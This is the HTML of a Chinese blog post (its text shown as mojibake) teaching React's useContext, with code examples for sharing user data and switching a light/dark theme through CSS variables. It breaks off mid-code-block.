<p>ç›®å…‰å†æ¬¡é£˜å‘çª—å¤–çš„é˜³å…‰ï¼Œç¼“ç¼“è¯´é“ï¼š"è¿™å•Šï¼Œåˆæ˜¯æ˜å¤©çš„æ•…äº‹äº†ã€‚"</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React å­¦ä¹ ï¼šuseContextâ€”â€”ä¼˜é›…è§£å†³è·¨å±‚çº§ç»„ä»¶é€šä¿¡]]></title>    <link>https://juejin.cn/post/7589170021931991055</link>    <guid>https://juejin.cn/post/7589170021931991055</guid>    <pubDate>2025-12-30T00:44:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589170021931991055" data-draft-id="7588388014504902698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" React å­¦ä¹ ï¼šuseContextâ€”â€”ä¼˜é›…è§£å†³è·¨å±‚çº§ç»„ä»¶é€šä¿¡"/> <meta itemprop="keywords" content="JavaScript,é¢è¯•,React.js"/> <meta itemprop="datePublished" content="2025-12-30T00:44:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å—å±±å®‰"/> <meta itemprop="url" content="https://juejin.cn/user/1795929588117962"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             React å­¦ä¹ ï¼šuseContextâ€”â€”ä¼˜é›…è§£å†³è·¨å±‚çº§ç»„ä»¶é€šä¿¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1795929588117962/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å—å±±å®‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:44:42.000Z" title="Tue Dec 30 2025 00:44:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å‰å‡ å¤©å­¦ä¹ å®Œäº†Reactä¸­åŸºæœ¬çš„ç»„ä»¶é€šä¿¡ï¼Œçˆ¶ä¼ å­ï¼Œå­ä¼ çˆ¶ä»¥åŠå…„å¼Ÿç»„ä»¶ä¹‹é—´çš„é€šè®¯ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨ä¸‹æ¥ï¼Œå‘ç°ä¸€ä½†åµŒå¥—å…³ç³»å¤æ‚ï¼Œæ•°æ®ä¼ é€’å°±éš¾å…å˜å¾—å¤æ‚ä¸”å¤šä½™ï¼Œä¸€ä¸ªå­ç»„ä»¶æƒ³è¦è·å–ä¸€ä¸ªæ•°æ®ç«Ÿç„¶è¦ä¸€æ­¥æ­¥ä»æ ¹ç»„ä»¶ä¸­ä¼ é€’è·å–ï¼Œäºæ˜¯æˆ‘åˆå­¦ä¹ äº†useContextâ€”â€”â€”è·¨ç»„ä»¶é€šè®¯æ–¹å¼ã€‚</p>
<p>æ„Ÿè§‰å®ƒçœŸæ˜¯è§£å†³â€œé“å…·ç©¿é€â€ï¼ˆProp Drillingï¼‰é—®é¢˜çš„ä¸€æŠŠå¥½é’¥åŒ™ã€‚ã€‚ä¸‹é¢æŠŠæˆ‘å­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ã€ä»£ç å’Œæ€è€ƒæ•´ç†æˆä¸€ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¸®åˆ°åŒæ ·åœ¨çº ç»“ç»„ä»¶é€šä¿¡çš„åŒå­¦ã€‚</p>
<h2 data-id="heading-1">ä¼ ç»Ÿçˆ¶å­ç»„ä»¶é€šä¿¡çš„ç—›ç‚¹</h2>
<p>æœ€å¸¸è§çš„ç»„ä»¶é€šä¿¡æ–¹å¼å°±æ˜¯çˆ¶ç»„ä»¶é€šè¿‡ props æŠŠæ•°æ®ä¼ ç»™å­ç»„ä»¶ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬æœ‰ä¸€ä¸ªç™»å½•åçš„ç”¨æˆ·ä¿¡æ¯ï¼Œéœ€è¦æ˜¾ç¤ºåœ¨æœ€åº•å±‚çš„å¤´åƒç»„ä»¶é‡Œï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// App.jsxï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Page</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserInfo</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params">{ user }</span>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"Andrew"</span> };
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> <span class="hljs-attr">user</span>=<span class="hljs-string">{user}</span> /&gt;</span></span>;
}
</code></pre>
<p>è¿™æ ·å†™æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†ä¸€æ—¦å±‚çº§å˜æ·±â€”â€”æ¯”å¦‚ Page â†’ Layout â†’ Sidebar â†’ Header â†’ Avatarï¼Œä½ å°±å¾—åœ¨æ¯ä¸€å±‚éƒ½è€è€å®å®æ¥æ”¶å¹¶è½¬å‘ user è¿™ä¸ª propã€‚ä»£ç é‡Œå……æ–¥ç€æ¯«æ— æ„ä¹‰çš„â€œä¸­è½¬ç«™â€ï¼Œé˜…è¯»å’Œç»´æŠ¤æˆæœ¬ç›´çº¿ä¸Šå‡ã€‚</p>
<p>æˆ‘çš„ç¬”è®°é‡Œå†™å¾—å¾ˆæ¸…æ¥šï¼š</p>
<ul>
<li>ä¸€è·¯ä¼ é€’ä¸‹å» æ€§ä»·æ¯”ä¸é«˜ éº»çƒ¦</li>
<li>è§„çŸ©ä¸å˜ï¼šçˆ¶ç»„ä»¶ï¼ˆå¤–ç»„ä»¶ï¼‰å¤æ‚æŒæœ‰å’Œæ”¹å˜æ•°æ®</li>
<li>å¤§äºçˆ¶å­å±‚çº§ï¼Œä¼ é€’çš„è·¯å¾„å¤ªé•¿</li>
</ul>
<p>è¿™å°±æ˜¯ç»å…¸çš„ <strong>Prop Drilling</strong> é—®é¢˜ã€‚</p>
<h2 data-id="heading-2">useContext çš„æ ¸å¿ƒæ€æƒ³</h2>
<p>useContext çš„å‡ºç°ï¼Œå°±æ˜¯ä¸ºäº†å½»åº•è§£å†³è·¨å±‚çº§ä¼ é€’çš„å°´å°¬ã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒç†å¿µå¯ä»¥ç”¨ä¸¤å¥è¯æ¦‚æ‹¬ï¼ˆä¹Ÿæ˜¯æˆ‘ç¬”è®°é‡Œåå¤å¼ºè°ƒçš„ï¼‰ï¼š</p>
<ol>
<li>æ•°æ®åœ¨æœ€å¤–å±‚æä¾›ï¼Œç»™ç»„ä»¶æ ‘é‡Œä»»ä½•å±‚çº§çš„åä»£éšä¾¿ç”¨ã€‚</li>
<li>éœ€è¦æ¶ˆè´¹æ•°æ®çš„ç»„ä»¶è‡ªå·±å»â€œæ‰¾â€æ•°æ®ï¼Œè€Œä¸æ˜¯è¢«åŠ¨æ¥æ”¶ propsã€‚</li>
</ol>
<p>æ¢å¥è¯è¯´ï¼š<strong>æä¾›è€…ï¼ˆProviderï¼‰å¹¿æ’­æ•°æ®ï¼Œæ¶ˆè´¹è€…ä¸»åŠ¨è®¢é˜…</strong>ã€‚</p>
<p>è¿™æ ·åšçš„å¥½å¤„æ˜¾è€Œæ˜“è§ï¼š</p>
<ul>
<li>ä¸­é—´å±‚ç»„ä»¶å®Œå…¨ä¸éœ€è¦å…³å¿ƒè¿™ä¸ªæ•°æ®æ˜¯å¦å­˜åœ¨</li>
<li>æ•°æ®ç®¡ç†é›†ä¸­åœ¨æœ€å¤–å±‚ï¼Œé€»è¾‘æ¸…æ™°</li>
<li>ä»»æ„æ·±åº¦çš„åä»£ç»„ä»¶éƒ½èƒ½ç›´æ¥è·å–æœ€æ–°æ•°æ®</li>
</ul>
<h2 data-id="heading-3">æ‰‹æŠŠæ‰‹å®ç°ä¸€ä¸ªç”¨æˆ·ä¿¡æ¯è·¨å±‚çº§å…±äº«</h2>
<p>æˆ‘ä»¬ç”¨æœ€ç®€å•çš„ç”¨æˆ·ç™»å½•ä¿¡æ¯æ¥æ¼”ç¤ºã€‚</p>
<h3 data-id="heading-4">1. åˆ›å»º Context</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// src/App2.jsx</span>
<span class="hljs-keyword">import</span> { createContext } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);
</code></pre>
<p>createContext(defaultValue) ä¼šè¿”å›ä¸€ä¸ª Context å¯¹è±¡ã€‚é»˜è®¤å€¼åªæœ‰åœ¨æ²¡æœ‰åŒ¹é…åˆ° Provider æ—¶æ‰ä¼šç”¨åˆ°ï¼Œé€šå¸¸æˆ‘ä»¬ä¼  nullã€‚</p>
<h3 data-id="heading-5">2. åœ¨æ ¹éƒ¨æä¾›æ•°æ®</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// App2.jsx</span>
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Page</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"../views/Page"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./App2"</span>;  <span class="hljs-comment">// åŒä¸€ä¸ªæ–‡ä»¶é‡Œå¯ä»¥ç›´æ¥å¼•ç”¨</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = { <span class="hljs-attr">name</span>: <span class="hljs-string">"åé«˜ä¿Š"</span> };   <span class="hljs-comment">// å®é™…é¡¹ç›®é‡Œå¯èƒ½æ˜¯ç™»å½•åä»æ¥å£æ‹¿åˆ°çš„</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{user}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span>
  );
}
</code></pre>
<p>Provider çš„ value å±æ€§å°±æ˜¯æˆ‘ä»¬è¦å…±äº«çš„æ•°æ®ã€‚åªè¦ç»„ä»¶æ ‘è¢«è¿™ä¸ª Provider åŒ…è£¹ï¼Œé‡Œé¢çš„ä»»ä½•ç»„ä»¶éƒ½èƒ½è®¿é—®åˆ°ã€‚</p>
<h3 data-id="heading-6">3. ä»»æ„åä»£ç»„ä»¶æ¶ˆè´¹æ•°æ®</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// components/UserInfo.jsx</span>
<span class="hljs-keyword">import</span> { useContext } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">UserContext</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"../src/App2"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserInfo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">UserContext</span>);

  <span class="hljs-comment">// å¦‚æœæ²¡æ‰¾åˆ° Providerï¼Œuser ä¼šæ˜¯ createContext æ—¶ä¼ çš„é»˜è®¤å€¼ï¼ˆè¿™é‡Œæ˜¯ nullï¼‰</span>
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user?.name ?? "æœªç™»å½•"}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p>ç»„ä»¶æ ‘ç»“æ„å¯ä»¥æ˜¯ï¼š</p>
<p>App â†’ Page â†’ Header â†’ UserInfo</p>
<p>æ³¨æ„ Header å’Œ Page å®Œå…¨ä¸éœ€è¦æ¥æ”¶ä»»ä½• propsï¼ŒUserInfo ç›´æ¥é€šè¿‡ useContext æ‹¿åˆ°æ•°æ®ã€‚</p>
<p>â€œè¦æ¶ˆè´¹æ•°æ®çŠ¶æ€çš„ç»„ä»¶æ‹¥æœ‰æ‰¾æ•°æ®çš„èƒ½åŠ›ï¼ˆä¼ é€’æ˜¯è¢«åŠ¨æ¥æ”¶ï¼‰â€ã€‚</p>
<h4 data-id="heading-7">å®Œæ•´è°ƒç”¨æµç¨‹å›¾è§£</h4>
<pre><code class="hljs language-text" lang="text">1. åˆ›å»ºå®¹å™¨
   â†“
src/contexts/UserContext.js
export const UserContext = createContext(null);

2. åœ¨æ ¹ç»„ä»¶æä¾›æ•°æ®
   â†“
App.jsx
&lt;UserContext.Provider value={user}&gt;
  &lt;Page /&gt;
&lt;/UserContext.Provider&gt;

3. åœ¨ä»»æ„åä»£ç»„ä»¶æ¶ˆè´¹æ•°æ®
   â†“
components/Header/UserInfo.jsx
const user = useContext(UserContext);
return &lt;div&gt;{user.name}&lt;/div&gt;;
</code></pre>
<p>ç»„ä»¶ç»“æ„å¯ä»¥æ˜¯ï¼š App â†’ Layout â†’ Sidebar â†’ Header â†’ Avatar â†’ UserInfo ä¸­é—´æ‰€æœ‰ç»„ä»¶éƒ½ä¸éœ€è¦å†™ propsï¼ŒUserInfo ç›´æ¥å°±èƒ½æ‹¿åˆ° user æ•°æ®ï¼</p>
<h4 data-id="heading-8">æ€»ç»“</h4>

























<table><thead><tr><th>åç§°</th><th>ä½œç”¨</th><th>è°ƒç”¨ä½ç½®</th></tr></thead><tbody><tr><td>createContext</td><td>åˆ›å»ºä¸€ä¸ªå…±äº«æ•°æ®çš„å®¹å™¨</td><td>é€šå¸¸å•ç‹¬æ–‡ä»¶å¯¼å‡º</td></tr><tr><td>&lt;Context.Provider&gt;</td><td>æä¾›å®é™…æ•°æ®ï¼ˆvalueï¼‰</td><td>ç»„ä»¶æ ‘è¾ƒé«˜å±‚çº§ï¼ˆå¦‚ App æœ€å¤–å±‚ï¼‰</td></tr><tr><td>useContext(Context)</td><td>å–å‡ºå½“å‰ Context çš„æ•°æ®</td><td>ä»»æ„éœ€è¦ä½¿ç”¨æ•°æ®çš„å­ç»„ä»¶ä¸­</td></tr></tbody></table>
<h2 data-id="heading-9">è¿›é˜¶ï¼šContext é‡Œæ”¾å¯å˜çŠ¶æ€ï¼ˆä¸»é¢˜åˆ‡æ¢å®æˆ˜ï¼‰</h2>
<p>å•çº¯å…±äº«é™æ€æ•°æ®å·²ç»å¾ˆé¦™äº†ï¼Œä½†çœŸæ­£çš„å¨åŠ›åœ¨äºæŠŠ<strong>çŠ¶æ€ + æ›´æ–°å‡½æ•°</strong>ä¸€èµ·æ”¾è¿› Contextï¼Œå®ç°å…¨å±€å¯å˜å…±äº«çŠ¶æ€ã€‚</p>
<p>ä¸»é¢˜åˆ‡æ¢ï¼ˆç™½å¤©/å¤œé—´æ¨¡å¼ï¼‰æ˜¯æœ€ç»å…¸çš„ä¾‹å­ï¼Œä¹Ÿæ˜¯æˆ‘ç¬”è®°é‡Œä¸“é—¨æ ‡è®°çš„ demoã€‚</p>
<h3 data-id="heading-10">æ€è·¯</h3>
<ul>
<li>åœ¨æ ¹ç»„ä»¶åˆ›å»ºä¸€ä¸ª theme çŠ¶æ€å’Œ toggleTheme å‡½æ•°</li>
<li>æŠŠä¸¤è€…é€šè¿‡ Context æä¾›ç»™å…¨å±€</li>
<li>ä»»æ„ç»„ä»¶ï¼ˆå“ªæ€•æ˜¯æœ€åº•å±‚çš„æŒ‰é’®ï¼‰éƒ½å¯ä»¥è¯»å–å½“å‰ä¸»é¢˜å¹¶è§¦å‘åˆ‡æ¢</li>
<li>ä¸»é¢˜å®é™…ç”Ÿæ•ˆæ–¹å¼ï¼šé€šè¿‡ CSS è‡ªå®šä¹‰å±æ€§ï¼ˆCSS Variablesï¼‰</li>
</ul>
<h3 data-id="heading-11">1. å®šä¹‰ ThemeContext</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// contexts/ThemeContext.jsx</span>
<span class="hljs-keyword">import</span> { createContext, useContext, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeProvider</span>(<span class="hljs-params">{ children }</span>) {
  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>); <span class="hljs-comment">// light | dark</span>

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggleTheme</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">setTheme</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (prev === <span class="hljs-string">"light"</span> ? <span class="hljs-string">"dark"</span> : <span class="hljs-string">"light"</span>));
  };

  <span class="hljs-comment">// åŒæ—¶æŠŠ theme å’Œ toggleTheme æš´éœ²å‡ºå»</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">theme</span>, <span class="hljs-attr">toggleTheme</span> }}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span>
  );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useTheme</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);
</code></pre>
<p>å°è£…ä¸€ä¸ªè‡ªå®šä¹‰ Hook useThemeï¼Œè°ƒç”¨èµ·æ¥æ›´æ¸…æ™°ã€‚</p>
<h3 data-id="heading-12">2. CSS å˜é‡å®ç°çœŸæ­£çš„å…¨å±€ä¸»é¢˜</h3>
<pre><code class="hljs language-CSS" lang="CSS"><span class="hljs-comment">/* theme.css */</span>
<span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#ffffff</span>;
  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#222</span>;
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#1677ff</span>;
}

<span class="hljs-selector-attr">[data-theme=<span class="hljs-string">"dark"</span>]</span> {
  <span class="hljs-attr">--bg-color</span>: <span class="hljs-number">#141414</span>;
  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#f5f5f5</span>;
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#4e8cff</span>;
}

<span class="hljs-selector-tag">body</span> {
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--bg-color);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--primary-color);
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}
</code></pre>
<p>å…³é”®ç‚¹ï¼šåœ¨ &lt; html&gt; æ ‡ç­¾ä¸ŠåŠ¨æ€æ·»åŠ  data-theme å±æ€§ã€‚</p>
<h3 data-id="heading-13">3. æ ¹ç»„ä»¶åº”ç”¨ä¸»é¢˜</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// App.jsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ThemeProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"./contexts/ThemeContext"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Page</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./pages/Page"</span>;
<span class="hljs-keyword">import</span> { useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;
<span class="hljs-keyword">import</span> { useTheme } <span class="hljs-keyword">from</span> <span class="hljs-string">"./contexts/ThemeContext"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Root</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { theme } = <span class="hljs-title function_">useTheme</span>();

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">theme</span> = theme;
  }, [theme]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Page</span> /&gt;</span></span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ThemeProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Root</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ThemeProvider</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-14">4. ä»»æ„ç»„ä»¶ä½¿ç”¨ä¸»é¢˜å’Œåˆ‡æ¢</h3>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// components/ThemeToggleButton.jsx</span>
<span class="hljs-keyword">import</span> { useTheme } <span class="hljs-keyword">from</span> <span class="hljs-string">"../contexts/ThemeContext"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeToggleButton</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { theme, toggleTheme } = <span class="hljs-title function_">useTheme</span>();

  <span class="hljs-keyword">return</span> (
